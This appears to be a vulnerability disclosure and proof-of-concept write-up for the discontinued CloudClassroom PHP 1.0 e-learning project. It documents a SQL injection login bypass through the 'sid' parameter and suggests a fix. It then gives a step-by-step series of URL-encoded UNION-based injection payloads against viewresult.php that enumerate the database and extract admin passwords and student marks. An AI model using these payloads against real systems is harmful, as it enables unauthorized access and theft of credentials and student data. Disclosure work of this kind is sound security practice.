# Cloud-Classroom-PHP-1.0


Poc 2 - POST /classrooms/loginlinkstudent

Presentation: SQL Injection Bypass Authentication via POST sid parameter

Security vulnerability: SQL Injection - Authentication Bypass

Vulnerability Type: Injection

Affected Component: loginlinkstudent endpoint — POST parameter sid

Software: CloudClassroom PHP Project

Version: 1.0 (discontinued)

Business Area: Education / e-Learning Platforms

Description of the issue:
The login functionality accepts a POST parameter sid (student ID) and directly uses it in an SQL query without sanitization or parameterization. This enables an attacker to inject SQL code that bypasses authentication.

Example vulnerable query (simplified):

SELECT * FROM students WHERE sid = '$sid' AND pass = '$pass';
By injecting SQL in sid, the attacker can manipulate the query logic to always evaluate to true, bypassing login.

Impact:
Allows bypassing authentication without valid credentials.

Grants unauthorized access to protected areas of the application.

Potential access to sensitive student data.

Example of malicious payload in sid:

1' or 1=1-- -
This payload closes the string, adds an always-true condition or 1=1, and comments out the rest of the query.

Example full POST request (payload URL-encoded):

sid=1' or 1=1-- -&pass=a&login=


Expected behavior after injection:
The login check bypasses password verification.

The server grants access or session initialization for the attacker.

Severity: High — allows full authentication bypass.

Recommended Fix: Use parameterized queries (prepared statements) for sid and pass.

Properly sanitize and validate inputs.

Employ strong authentication and session management.

References:
CWE-89: SQL Injection

OWASP SQL Injection Prevention Cheat Sheet



SQL-Injection Bypass-Authentication

Payload: 1' or 1=1-- -'

<img width="1345" height="416" alt="image" src="https://github.com/user-attachments/assets/fd7aa3cc-f0fd-46d9-8f51-ed689c3d6204" />

Full-path disclosure

<img width="1417" height="470" alt="image" src="https://github.com/user-attachments/assets/b5a339a0-0930-4900-ad74-d55a97f93914" />


<img width="1330" height="269" alt="image" src="https://github.com/user-attachments/assets/97d8405e-0830-4ee6-81e6-9e9557b082a8" />



Poc 3 - classrooms/viewresult.php

By bypassing we can access viewresult.php via GET, the endpoint is also subject to SQL injection, we can extract data via SQL UNION based.


http://10.10.91.146:20000/classrooms/viewresult.php?seno=146891650%27%20OR%20%271%27%3D%271%27%20--%20-

<img width="1033" height="520" alt="image" src="https://github.com/user-attachments/assets/0db4277a-b135-4046-9744-a27d30a2ed98" />


123'%20ORDER%20BY%201%20--%20-

<img width="958" height="335" alt="image" src="https://github.com/user-attachments/assets/9ec7cd0b-7cf7-46e6-a4cf-43c586c86fee" />


123%27%20ORDER%20BY%205%20--%20-

<img width="951" height="443" alt="image" src="https://github.com/user-attachments/assets/96f31485-4e35-43b3-886d-6d429edc8752" />


' UNION SELECT 1,2,3,4 -- -
<img width="964" height="354" alt="image" src="https://github.com/user-attachments/assets/ab91a095-9adc-453b-9a54-f9280b74a06b" />


%27%20UNION%20SELECT%201,@@version,3,4%20--%20-
<img width="1040" height="358" alt="image" src="https://github.com/user-attachments/assets/6ace65f7-ea6b-4b53-a09f-4624b37658fd" />


%27%20UNION%20SELECT%201,database(),3,4%20--%20-
<img width="905" height="331" alt="image" src="https://github.com/user-attachments/assets/661b194f-aaad-4ce8-b247-aa44e9c0e0aa" />


%27%20UNION%20SELECT%201,table_name,3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20-
<img width="1442" height="670" alt="image" src="https://github.com/user-attachments/assets/39ffa26a-1fdf-4db2-89b7-f38ebd6f7a11" />


%27%20UNION%20SELECT%201,column_name,3,4%20FROM%20information_schema.columns%20WHERE%20table_name=%27admin%27%20--%20-
<img width="1486" height="358" alt="image" src="https://github.com/user-attachments/assets/77d108bd-6f96-4681-a775-02360937bf6d" />

123%27%20UNION%20SELECT%201,%20Aid,%20Apass,%204%20FROM%20admin%20--%20-%20-
<img width="1134" height="369" alt="image" src="https://github.com/user-attachments/assets/81ca4ee2-616a-4750-b04e-643dcb046a17" />


%27%20UNION%20SELECT%201,Eno,Marks,4%20FROM%20result%20--%20-
<img width="1191" height="435" alt="image" src="https://github.com/user-attachments/assets/acf62b99-920a-4e1b-845c-521810283ee3" />

